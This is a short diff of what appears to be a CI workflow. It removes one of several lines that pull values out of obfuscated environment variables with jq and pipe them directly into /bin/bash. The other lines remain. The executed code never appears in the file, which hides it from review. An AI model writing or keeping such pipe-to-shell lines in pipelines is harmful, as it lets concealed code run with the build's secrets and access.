@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$tu03027" | jq -r .copib37640 | /bin/bash
           echo $hmq7 | jq -r .h846 | /bin/bash
-          printf '%s' "$yop16" | jq -r .amwva43031 | /bin/bash
           echo $iaxf07858 | jq -r .ocmd6240 | /bin/bash
 
       - name: Upload results
